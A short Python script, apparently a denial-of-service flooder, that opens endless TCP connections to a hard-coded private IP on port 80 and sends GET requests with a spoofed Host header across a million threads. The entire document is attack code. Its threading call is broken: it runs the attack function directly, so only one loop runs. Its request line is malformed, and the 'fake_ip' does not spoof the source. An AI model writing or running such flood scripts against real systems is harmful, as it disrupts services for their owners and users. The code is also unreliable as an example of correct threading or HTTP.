import threading
import socket

target = "192.168.229.81"
port = 80
fake_ip = "192.168.229.52"

def attack():
    while True:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"),(target,port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target,port))


for i in range(1000000):
    thread = threading.Thread(target=attack())
    thread.start()